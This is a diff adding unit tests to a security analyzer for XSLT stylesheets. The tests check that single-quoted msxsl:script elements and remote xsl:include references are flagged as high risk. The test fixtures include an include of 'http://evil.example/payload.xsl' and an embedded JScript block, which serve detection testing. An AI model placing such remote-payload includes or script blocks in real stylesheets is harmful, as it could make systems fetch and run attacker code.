@@ -75,6 +75,34 @@ test('xslt: <msxsl:script language="C#"> also detected', () => {
   assert.match(det.url, /C#/);
 });
 
+test("xslt: <msxsl:script language='JScript'> single-quoted attr also detected", () => {
+  // XML allows either quote style for attributes; analyzer must not
+  // be fooled by single-quoted `language='…'` (regression for the
+  // original double-quote-only regex).
+  const xml = XSL_HEAD
+    + "<msxsl:script language='JScript'>x</msxsl:script>\n"
+    + XSL_TAIL;
+  const r = new XsltRenderer();
+  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
+  assert.equal(f.risk, 'high');
+  const det = f.externalRefs.find(x =>
+    x.type === IOC.PATTERN && /msxsl:script/.test(x.url));
+  assert.ok(det);
+  assert.match(det.url, /JScript/);
+});
+
+test("xslt: <xsl:include href='http://…'> single-quoted attr also fires", () => {
+  const xml = XSL_HEAD
+    + "<xsl:include href='http://evil.example/payload.xsl'/>\n"
+    + XSL_TAIL;
+  const r = new XsltRenderer();
+  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
+  assert.equal(f.risk, 'high');
+  const det = f.externalRefs.find(x =>
+    x.type === IOC.PATTERN && /remote URL/.test(x.url));
+  assert.ok(det);
+});
+
 test('xslt: <xsl:include href="http://…"> fires high + URL IOC', () => {
   const xml = XSL_HEAD
     + '<xsl:include href="http://evil.example/payload.xsl"/>\n'
